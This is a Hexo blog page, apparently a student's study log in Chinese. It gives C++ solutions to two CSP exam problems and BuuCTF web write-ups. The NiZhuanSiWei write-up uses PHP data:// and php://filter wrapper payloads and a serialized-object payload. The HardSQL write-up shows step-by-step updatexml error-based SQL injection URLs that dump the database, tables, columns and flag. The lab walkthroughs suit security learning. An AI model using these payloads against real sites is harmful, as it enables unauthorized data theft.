@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>20240224 | qinyiwen</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="CSP2022-12-1 现值计算&#x3D;输入n和i，n表示复利的次数，i表示利率。然后用户输入n个数值，代表每次复利的金额。根据复利公式计算出总的复利金额，并输出结果。 123456789101112131415161718#include&lt;iostream&gt;#include&lt;math.h&gt;using namespace std; int main()&amp;#123;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="20240224">
+<meta property="og:url" content="http://example.com/2024/02/24/20240224/index.html">
+<meta property="og:site_name" content="qinyiwen">
+<meta property="og:description" content="CSP2022-12-1 现值计算&#x3D;输入n和i，n表示复利的次数，i表示利率。然后用户输入n个数值，代表每次复利的金额。根据复利公式计算出总的复利金额，并输出结果。 123456789101112131415161718#include&lt;iostream&gt;#include&lt;math.h&gt;using namespace std; int main()&amp;#123;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/2ed62ae4-cebd-49e4-9fff-62144ce580d8">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/7acb96ce-aecd-4d57-813d-096ae3ddf798">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/22b156d1-ff92-4112-a963-03edd63872d5">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/bd421ff2-86f8-48fc-8536-ba0c204a473a">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/ff8cc374-6ccb-426b-8372-707bdb01642a">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/750e7fdf-d5d6-4c19-a5eb-19b42d5f7b33">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/9ebb7fdd-ca59-4728-bf1d-30e878e931e2">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/64288a23-13c1-4116-8574-dba7738b1408">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/40172d44-3758-4a26-be49-45c7087c0dbc">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/ae5611e0-f140-4525-af9f-049d55033cce">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/73ca09b1-1eb7-4fd3-ab8a-3b4a4ab60464">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/f0bb9dd2-c888-4015-8365-e30b0fab3422">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/dc636dd7-18e8-41b5-ac79-d1cdd9ddb8ae">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/25ed0a2d-a386-4f5a-a67b-ec2fe58b275a">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/735591d7-7347-4231-8cf4-8e214d661a5c">
+<meta property="article:published_time" content="2024-02-24T12:01:19.000Z">
+<meta property="article:modified_time" content="2024-02-24T12:05:49.521Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="learn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/2ed62ae4-cebd-49e4-9fff-62144ce580d8">
+  
+    <link rel="alternate" href="/atom.xml" title="qinyiwen" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">qinyiwen</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-20240224" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/02/24/20240224/" class="article-date">
+  <time class="dt-published" datetime="2024-02-24T12:01:19.000Z" itemprop="datePublished">2024-02-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      20240224
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h4><h5 id="2022-12-1-现值计算"><a href="#2022-12-1-现值计算" class="headerlink" title="2022-12-1 现值计算"></a>2022-12-1 现值计算</h5><p>&#x3D;输入n和i，n表示复利的次数，i表示利率。然后用户输入n个数值，代表每次复利的金额。根据复利公式计算出总的复利金额，并输出结果。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n,j,m;</span><br><span class="line">    <span class="type">float</span> i,sum=<span class="number">0</span>;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;i;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;=n;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        cin&gt;&gt;m;</span><br><span class="line">        sum+=m*<span class="built_in">pow</span>(<span class="number">1</span>+i,-j);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.3f\n&quot;</span>,sum);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="2022-12-2-训练计划"><a href="#2022-12-2-训练计划" class="headerlink" title="2022-12-2 训练计划"></a>2022-12-2 训练计划</h5><p>70分</p>
+<p>任务调度。输入n和m，n表示任务总数，m表示操作总数。接着输入m个操作，每个操作包括两个数值，第一个数值表示依赖的前一个操作的编号，第二个数值表示该操作需要的时间。程序会根据这些输入计算出每个操作的开始时间和结束时间，并输出结果。如果所有操作都能在规定时间内完成，则输出每个操作的开始时间和结束时间；如果有某个操作无法在规定时间内完成，则输出”0”表示无法完成。最后返回0表示程序正常结束。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a[<span class="number">102</span>][<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> timee[<span class="number">102</span>]=&#123;<span class="number">1</span>&#125;;</span><br><span class="line"><span class="type">int</span> timel[<span class="number">102</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n,m,i,pd=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cin&gt;&gt;a[i][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cin&gt;&gt;a[i][<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i][<span class="number">0</span>]==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            timee[i]=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(a[i][<span class="number">1</span>]&gt;n) pd=<span class="number">0</span>;</span><br><span class="line">            timel[i]=n-a[i][<span class="number">1</span>]+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            timee[i]=timee[a[i][<span class="number">0</span>]]+a[a[i][<span class="number">0</span>]][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(timee[i]+a[i][<span class="number">1</span>]<span class="number">-1</span>&gt;n) pd=<span class="number">0</span>;</span><br><span class="line">            timel[i]=n-a[i][<span class="number">1</span>]+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;timee[i]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">if</span>(pd==<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;timel[i]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="BuuCTF"><a href="#BuuCTF" class="headerlink" title="BuuCTF"></a>BuuCTF</h4><h5 id="24、NiZhuanSiWei"><a href="#24、NiZhuanSiWei" class="headerlink" title="24、NiZhuanSiWei"></a>24、NiZhuanSiWei</h5><p>从题目的php代码中可以知道需要用get方式传三个参数，text，file，password</p>
+<p>有一个php文件</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/2ed62ae4-cebd-49e4-9fff-62144ce580d8" alt="image"></p>
+<p>访问该文件，什么都没有</p>
+<p>有一行代码说我们要传入一个文件，内容是”welcome to the zjctf”</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7acb96ce-aecd-4d57-813d-096ae3ddf798" alt="image"></p>
+<p>要用到data协议，data协议通常是用来执行PHP代码，也可以将内容写入data协议中，然后让file_get_contents函数取读取。构造：<code>data://text/plain,welcome to the zjctf</code></p>
+<p>为了绕过一些过滤，用base64编码构造payload：<code>/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/22b156d1-ff92-4112-a963-03edd63872d5" alt="image"></p>
+<p>有一个可控参数file，构造file&#x3D;useless.php，但是针对php文件我们需要进行base64编码，否则读取不到其内容，所以构造payload：<code>/?file=php://filter/read=convert.base64-encode/resource=useless.php</code></p>
+<p>完整payload：<code>/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></p>
+<p>得到一串base64编码</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/bd421ff2-86f8-48fc-8536-ba0c204a473a" alt="image"></p>
+<p>解码</p>
+<p>得到useless.php源码</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ff8cc374-6ccb-426b-8372-707bdb01642a" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure>
+
+<p>有一个 flag.php ,并且file不为空将读取flag.php并显示。所以。构造一个序列化字符串</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file=flag.php;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$a = new Flag();</span><br><span class="line">$a-&gt;file=&quot;flag.php&quot;;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
+
+<p>找个在<a target="_blank" rel="noopener" href="https://c.runoob.com/compile/1">线运行PHP</a>的网站，得到</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/750e7fdf-d5d6-4c19-a5eb-19b42d5f7b33" alt="image"></p>
+<p>构造payload：<code>/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9ebb7fdd-ca59-4728-bf1d-30e878e931e2" alt="image"></p>
+<p>查看源代码，得到flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/64288a23-13c1-4116-8574-dba7738b1408" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;6cb4bd76-2b5f-4876-9fe0-46f02e2d0062&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="25、HardSQL"><a href="#25、HardSQL" class="headerlink" title="25、HardSQL"></a>25、HardSQL</h5><p>一些and、union、select、空格等常见的SQL语句被过滤了</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">这道题是xpath报错注入，函数注入</span><br><span class="line"></span><br><span class="line">extractvalue()</span><br><span class="line">extractvalue() :对XML文档进行查询的函数</span><br><span class="line"></span><br><span class="line">语法：extractvalue(目标xml文档，xml路径)</span><br><span class="line"></span><br><span class="line">第一个参数 :   第一个参数可以传入目标xml文档</span><br><span class="line"></span><br><span class="line">第二个参数： xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</span><br><span class="line"></span><br><span class="line">　　　　　　正常查询 第二个参数的位置格式 为 /xxx/xx/xx/xx ,即使查询不到也不会报错</span><br><span class="line"></span><br><span class="line">tip: 还有要注意的地方是，它能够查询的字符串长度最大是32个字符，如果超过32位，我们就需要用函数来查询，比如right(),left()，substr()来截取字符串</span><br><span class="line"></span><br><span class="line">再举个栗子：</span><br><span class="line"></span><br><span class="line">SELECT ExtractValue(&#x27;&lt;a&gt;&lt;b&gt;&lt;b/&gt;&lt;/a&gt;&#x27;, &#x27;/a/b&#x27;); 这个语句就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。</span><br><span class="line"></span><br><span class="line">利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。</span><br></pre></td></tr></table></figure>
+
+<p>输入用户名：<code>1</code></p>
+<p>密码：<code>1&#39;or&#39;1&#39;=&#39;1</code></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/40172d44-3758-4a26-be49-45c7087c0dbc" alt="image"></p>
+<p>出现这段话，并且url加上了&#x2F;check.php</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ae5611e0-f140-4525-af9f-049d55033cce" alt="image"></p>
+<p>爆库名：<code>?username=admin&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&amp;password=111</code></p>
+<p>geek</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/73ca09b1-1eb7-4fd3-ab8a-3b4a4ab60464" alt="image"></p>
+<p>爆表名：<code>?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(%27geek%27)),0x7e),1))%23&amp;password=111</code></p>
+<p>H4rDsq1</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f0bb9dd2-c888-4015-8365-e30b0fab3422" alt="image"></p>
+<p>爆字段：<code>?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(%27H4rDsq1%27)),0x7e),1))%23&amp;password=111</code></p>
+<p>id,username,password</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/dc636dd7-18e8-41b5-ac79-d1cdd9ddb8ae" alt="image"></p>
+<p>爆数据：<code>?username=admin%27or(updatexml(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e),1))%23&amp;password=111</code></p>
+<p>flag{52272770-1ba7-4986-8a7d-cb</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/25ed0a2d-a386-4f5a-a67b-ec2fe58b275a" alt="image"></p>
+<p>这里只爆出前面一部分flag，然后再使用right()函数拼接flag<code>?username=admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))%23&amp;password=111</code></p>
+<p>7-4986-8a7d-cb84363e2987}</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/735591d7-7347-4231-8cf4-8e214d661a5c" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;52272770-1ba7-4986-8a7d-cb84363e2987&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/02/24/20240224/" data-id="clt01bv5c0000ssvf0e9z4oaq" data-title="20240224" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/learn/" rel="tag">learn</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2024/02/23/20240223/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">20240223</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/learn/" rel="tag">learn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/security/" rel="tag">security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" rel="tag">论文细读</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 16.67px;">CTF</a> <a href="/tags/Fuzzing/" style="font-size: 16.67px;">Fuzzing</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 13.33px;">Web安全</a> <a href="/tags/learn/" style="font-size: 20px;">learn</a> <a href="/tags/security/" style="font-size: 10px;">security</a> <a href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" style="font-size: 20px;">论文细读</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/02/24/20240224/">20240224</a>
+          </li>
+        
+          <li>
+            <a href="/2024/02/23/20240223/">20240223</a>
+          </li>
+        
+          <li>
+            <a href="/2024/02/22/20240222/">20240222</a>
+          </li>
+        
+          <li>
+            <a href="/2024/02/21/20240221/">20240221</a>
+          </li>
+        
+          <li>
+            <a href="/2024/02/20/20240220/">20240220</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
